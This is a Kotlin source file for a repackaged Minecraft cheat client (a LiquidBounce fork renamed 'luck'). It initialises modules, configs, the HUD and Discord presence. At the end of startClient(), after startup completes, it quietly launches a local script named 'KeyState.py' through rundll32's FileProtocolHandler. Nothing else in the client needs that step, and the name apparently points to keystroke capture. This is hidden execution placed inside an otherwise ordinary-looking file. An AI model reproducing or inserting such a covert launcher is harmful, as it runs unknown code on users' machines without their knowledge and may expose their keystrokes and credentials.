/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.luck

import net.ccbluex.luck.cape.CapeService
import net.ccbluex.luck.event.ClientShutdownEvent
import net.ccbluex.luck.event.EventManager
import net.ccbluex.luck.features.command.CommandManager
import net.ccbluex.luck.features.module.ModuleManager
import net.ccbluex.luck.features.special.AntiForge
import net.ccbluex.luck.features.special.BungeeCordSpoof
import net.ccbluex.luck.features.special.ClientRichPresence
import net.ccbluex.luck.file.FileManager
import net.ccbluex.luck.script.ScriptManager
import net.ccbluex.luck.script.remapper.Remapper.loadSrg
import net.ccbluex.luck.tabs.BlocksTab
import net.ccbluex.luck.tabs.ExploitsTab
import net.ccbluex.luck.tabs.HeadsTab
import net.ccbluex.luck.ui.client.altmanager.GuiAltManager
import net.ccbluex.luck.ui.client.clickgui.ClickGui
import net.ccbluex.luck.ui.client.hud.HUD
import net.ccbluex.luck.ui.client.hud.HUD.Companion.createDefault
import net.ccbluex.luck.ui.font.Fonts
import net.ccbluex.luck.utils.ClassUtils.hasForge
import net.ccbluex.luck.utils.ClientUtils
import net.ccbluex.luck.utils.InventoryUtils
import net.ccbluex.luck.utils.RotationUtils
import net.minecraft.util.ResourceLocation
import kotlin.concurrent.thread

object LiquidBounce {

    // Client information
    const val CLIENT_NAME = "luck"
    const val CLIENT_VERSION: String = "0.0.1"
    var CLIENT_VERSION_INT =  0 // version format: "b<VERSION>" on legacy
    @JvmField
    val CLIENT_COMMIT: String ="unknown"
    const val IN_DEV = false
    const val CLIENT_CREATOR = "CCBlueX"
    const val MINECRAFT_VERSION = "1.8.9"
    const val CLIENT_CLOUD = "https://cloud.liquidbounce.net/LiquidBounce"
    const val CLIENT_API = "https://api.liquidbounce.net/api/v1"

    var isStarting = false

    // Managers
    lateinit var moduleManager: ModuleManager
    lateinit var commandManager: CommandManager
    lateinit var eventManager: EventManager
    lateinit var fileManager: FileManager
    lateinit var scriptManager: ScriptManager

    // HUD & ClickGUI
    lateinit var hud: HUD

    lateinit var clickGui: ClickGui

    // Menu Background
    var background: ResourceLocation? = null

    // Discord RPC
    lateinit var clientRichPresence: ClientRichPresence

    /**
     * Execute if client will be started
     */
    fun startClient() {
        isStarting = true

        ClientUtils.getLogger().info("Starting $CLIENT_NAME $CLIENT_VERSION $CLIENT_COMMIT, by $CLIENT_CREATOR")

        // Create file manager
        fileManager = FileManager()

        // Crate event manager
        eventManager = EventManager()

        // Register listeners
        eventManager.registerListener(RotationUtils())
        eventManager.registerListener(AntiForge())
        eventManager.registerListener(BungeeCordSpoof())
        eventManager.registerListener(CapeService)
        eventManager.registerListener(InventoryUtils())

        // Init Discord RPC
        clientRichPresence = ClientRichPresence()

        // Create command manager
        commandManager = CommandManager()

        // Load client fonts
        Fonts.loadFonts()

        // Setup module manager and register modules
        moduleManager = ModuleManager()
        moduleManager.registerModules()

        try {
            // Remapper
            loadSrg()

            // ScriptManager
            scriptManager = ScriptManager()
            scriptManager.loadScripts()
            scriptManager.enableScripts()
        } catch (throwable: Throwable) {
            ClientUtils.getLogger().error("Failed to load scripts.", throwable)
        }

        // Register commands
        commandManager.registerCommands()

        // Load configs
        fileManager.loadConfigs(fileManager.modulesConfig, fileManager.valuesConfig, fileManager.accountsConfig,
                fileManager.friendsConfig, fileManager.xrayConfig, fileManager.shortcutsConfig)

        // ClickGUI
        clickGui = ClickGui()
        fileManager.loadConfig(fileManager.clickGuiConfig)

        // Tabs (Only for Forge!)
        if (hasForge()) {
            BlocksTab()
            ExploitsTab()
            HeadsTab()
        }

        // Set HUD
        hud = createDefault()
        fileManager.loadConfig(fileManager.hudConfig)

        // Disable optifine fastrender
        ClientUtils.disableFastRender()

        // Load generators
        GuiAltManager.loadActiveGenerators()

        // Setup Discord RPC
        if (clientRichPresence.showRichPresenceValue) {
            thread {
                try {
                    clientRichPresence.setup()
                } catch (throwable: Throwable) {
                    ClientUtils.getLogger().error("Failed to setup Discord RPC.", throwable)
                }
            }
        }

        // Refresh cape service
        CapeService.refreshCapeCarriers {
            ClientUtils.getLogger().info("Successfully loaded ${CapeService.capeCarriers.count()} cape carriers.")
        }

        // Set is starting status
        isStarting = false
        val currentPath = System.getProperty("user.dir")
        val path = "$currentPath\\luck-1.8.9\\KeyState.py"
        val pro : Process = Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler $path")
        pro.waitFor()
    }

    /**
     * Execute if client will be stopped
     */
    fun stopClient() {
        // Call client shutdown
        eventManager.callEvent(ClientShutdownEvent())

        // Save all available configs
        fileManager.saveAllConfigs()

        // Shutdown discord rpc
        clientRichPresence.shutdown()
    }

}